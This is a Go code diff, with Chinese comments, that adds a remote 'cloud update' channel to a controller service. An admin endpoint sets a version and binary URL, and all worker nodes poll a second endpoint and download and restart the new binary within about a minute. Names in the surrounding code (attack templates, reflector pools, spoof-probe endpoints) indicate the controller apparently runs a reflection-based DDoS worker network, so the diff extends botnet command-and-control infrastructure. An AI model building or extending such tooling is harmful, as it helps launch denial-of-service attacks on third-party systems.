@@ -138,6 +138,11 @@ type Ctrl struct {
 	publicIP      string
 	publicIPAt    time.Time
 	publicIPCache sync.RWMutex
+	// 云更新：目标版本 + 下载 URL，Worker 轮询后自动更新
+	updateFile    string
+	updateVersion string
+	updateURL     string
+	updateMu      sync.RWMutex
 }
 
 type AttackTemplate struct {
@@ -194,6 +199,21 @@ func New(grpcAddr, httpAddr string) *Ctrl {
 		}
 	}
 
+	// 云更新配置：data/deploy_update.json {"version":"...","url":"..."}
+	updateVersion, updateURL := "", ""
+	if updBytes, err := os.ReadFile("data/deploy_update.json"); err == nil {
+		var upd struct {
+			Version string `json:"version"`
+			URL     string `json:"url"`
+		}
+		if json.Unmarshal(updBytes, &upd) == nil {
+			updateVersion, updateURL = upd.Version, upd.URL
+			if updateVersion != "" && updateURL != "" {
+				log.Printf("[update] target version %s configured (url: %s)", updateVersion, updateURL)
+			}
+		}
+	}
+
 	reflector.InitAllPools()
 	reflector.MarkStaleRunningLogs()
 
@@ -216,6 +236,9 @@ func New(grpcAddr, httpAddr string) *Ctrl {
 		workerTokenFiles:  make(map[string]string),
 		deployFile:        "data/deploy_storage_url.txt",
 		deployStorageURL:  deployStorageURL,
+		updateFile:        "data/deploy_update.json",
+		updateVersion:     updateVersion,
+		updateURL:         updateURL,
 	}
 
 	// 加载 data/auth/workers/ 下的所有 token
@@ -340,6 +363,8 @@ func (c *Ctrl) Start() error {
 	mux.HandleFunc("/api/tokens/revoke", c.authAdmin(c.handleRevokeToken))
 	mux.HandleFunc("/api/deploy/config", c.authHTTP(c.handleDeployConfig))
 	mux.HandleFunc("/api/deploy/command", c.authHTTP(c.handleDeployCommand))
+	mux.HandleFunc("/api/deploy/update", c.authAdmin(c.handleDeployUpdate))
+	mux.HandleFunc("/api/deploy/version", c.authHTTP(c.handleDeployVersion))
 	mux.HandleFunc("/api/worker/spoof-probe", c.authHTTP(c.handleWorkerSpoofProbe))
 	mux.HandleFunc("/api/worker/spoof-probe/result", c.authHTTP(c.handleSpoofProbeResult))
 	mux.HandleFunc("/api/tasks/complete", c.authHTTP(c.handleTaskComplete))
@@ -1578,6 +1603,71 @@ func (c *Ctrl) handleDeployCommand(w http.ResponseWriter, r *http.Request) {
 		"addr":     addr,
 		"httpPort": httpPort,
 	})
+}
+
+// handleDeployUpdate PUT /api/deploy/update
+// 配置云更新目标：version（任意标识，如 v1.0.4）+ url（worker 二进制直链）。
+// 持久化到 data/deploy_update.json，所有 Worker 在 60s 内轮询到并自动更新重启。
+// 清空配置：body {"version":"","url":""}
+func (c *Ctrl) handleDeployUpdate(w http.ResponseWriter, r *http.Request) {
+	switch r.Method {
+	case "PUT", "POST":
+		var req struct {
+			Version string `json:"version"`
+			URL     string `json:"url"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+			http.Error(w, `{"error":"invalid json"}`, 400)
+			return
+		}
+		req.Version = strings.TrimSpace(req.Version)
+		req.URL = strings.TrimSpace(req.URL)
+		if req.Version != "" && !strings.HasPrefix(req.URL, "http://") && !strings.HasPrefix(req.URL, "https://") {
+			writeJSON(w, map[string]interface{}{"error": "url must start with http:// or https://"})
+			return
+		}
+		if (req.Version == "") != (req.URL == "") {
+			writeJSON(w, map[string]interface{}{"error": "version and url must be set together (or both empty to clear)"})
+			return
+		}
+
+		c.updateMu.Lock()
+		c.updateVersion = req.Version
+		c.updateURL = req.URL
+		c.updateMu.Unlock()
+
+		// 持久化
+		payload, _ := json.Marshal(map[string]string{"version": req.Version, "url": req.URL})
+		if err := os.WriteFile(c.updateFile, payload, 0644); err != nil {
+			http.Error(w, err.Error(), 500)
+			return
+		}
+
+		if req.Version != "" {
+			log.Printf("[update] target version %s set, all workers will update within ~60s", req.Version)
+		} else {
+			log.Printf("[update] update config cleared")
+		}
+		writeJSON(w, map[string]interface{}{"ok": true, "version": req.Version})
+
+	case "GET":
+		c.updateMu.RLock()
+		v, u := c.updateVersion, c.updateURL
+		c.updateMu.RUnlock()
+		writeJSON(w, map[string]interface{}{"version": v, "url": u})
+
+	default:
+		http.Error(w, `{"error":"method not allowed"}`, 405)
+	}
+}
+
+// handleDeployVersion GET /api/deploy/version
+// Worker 轮询端点：返回目标版本与下载 URL（worker token 可访问）。
+func (c *Ctrl) handleDeployVersion(w http.ResponseWriter, r *http.Request) {
+	c.updateMu.RLock()
+	v, u := c.updateVersion, c.updateURL
+	c.updateMu.RUnlock()
+	writeJSON(w, map[string]interface{}{"version": v, "url": u})
 }
 
 // getPublicIP 探测 Controller 公网 IP（缓存 1 小时）。
